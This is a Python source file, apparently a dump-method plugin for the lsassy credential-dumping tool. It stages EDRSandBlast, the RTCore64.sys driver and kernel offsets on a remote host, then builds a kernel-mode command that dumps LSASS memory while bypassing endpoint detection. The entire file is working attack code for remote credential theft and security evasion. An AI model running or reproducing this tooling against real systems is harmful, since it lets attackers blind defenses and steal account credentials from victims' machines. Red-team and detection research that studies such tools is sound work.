"""
https://github.com/wavestone-cdt/EDRSandblast
"""

from lsassy.dumpmethod import IDumpMethod, Dependency


class DumpMethod(IDumpMethod):
    def __init__(self, session, timeout):
        super().__init__(session, timeout)
        self.edrsandblast = Dependency("edrsandblast", "EDRSandBlast.exe")
        self.RTCore64 = Dependency("RTCore64", "RTCore64.sys")
        self.ntoskrnl = Dependency("ntoskrnl", "NtoskrnlOffsets.csv")

    def prepare(self, options):
        return self.prepare_dependencies(options, [self.edrsandblast, self.RTCore64, self.ntoskrnl])

    def clean(self):
        self.clean_dependencies([self.edrsandblast, self.RTCore64, self.ntoskrnl])

    def get_commands(self, dump_path=None, dump_name=None, no_powershell=False):
        cmd_command = """{} dump --kernelmode --driver {} --nt-offsets {} -o {}{}""".format(
            self.edrsandblast.get_remote_path(),
            self.RTCore64.get_remote_path(),
            self.ntoskrnl.get_remote_path(),
            self.dump_path, self.dump_name
        )

        return {
            "cmd": cmd_command,
            "pwsh": cmd_command
        }
